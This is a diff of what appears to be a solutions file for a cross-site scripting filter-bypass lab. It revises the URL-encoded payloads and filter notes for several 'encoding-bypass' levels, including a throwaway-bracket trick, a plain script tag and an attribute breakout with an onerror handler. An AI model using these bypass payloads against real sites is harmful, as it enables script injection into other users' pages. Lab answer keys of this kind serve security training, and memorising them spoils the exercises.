@@ -11,10 +11,10 @@ Server filter strategies bypassable via case mix, double-encoding, alternative t
 
 ### encoding-bypass-level2
 
-`/encoding-bypass/level2/?query=%3C%3Cscript%3E%3Escript%3Ealert(1)%3C/script%3E`
+`/encoding-bypass/level2/?query=%3C%3E%3Cscript%3Ealert(1)%3C/script%3E`
 
-- payload: `<<script>>script>alert(1)</script>`
-- context: only first `<` and first `>` stripped — duplicate them
+- payload: `<><script>alert(1)</script>`
+- context: only the first `<` and first `>` are removed; spend them on a throwaway pair
 
 ### encoding-bypass-level3
 
@@ -25,17 +25,17 @@ Server filter strategies bypassable via case mix, double-encoding, alternative t
 
 ### encoding-bypass-level4
 
-`/encoding-bypass/level4/?query=%3Csvg%3E%3Cset%20attributeName=onload%20to=alert(1)%3E%3Canimate%20begin=0s%3E%3C/svg%3E`
+`/encoding-bypass/level4/?query=%3Cscript%3Ealert(1)%3C/script%3E`
 
-- payload: `<svg><set attributeName=onload to=alert(1)><animate begin=0s></svg>`
-- context: strips `on\w+=` attributes; use SVG SMIL `<set>` to assign onload via attributeName
+- payload: `<script>alert(1)</script>`
+- context: only `on\w+=` attributes are stripped; tags pass
 
 ### encoding-bypass-level5
 
-`/encoding-bypass/level5/?query=data:text/html,%3Cscript%3Ealert(1)%3C/script%3E`
+`/encoding-bypass/level5/?query=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`
 
-- payload: `data:text/html,<script>alert(1)</script>`
-- context: `javascript:` stripped; reflected in `<a href="...">` — use data: URL
+- payload: `"><img src=x onerror=alert(1)>`
+- context: `javascript:` stripped in `<a href="...">`; data: navigation is blocked, so break out
 
 ### encoding-bypass-level6
 
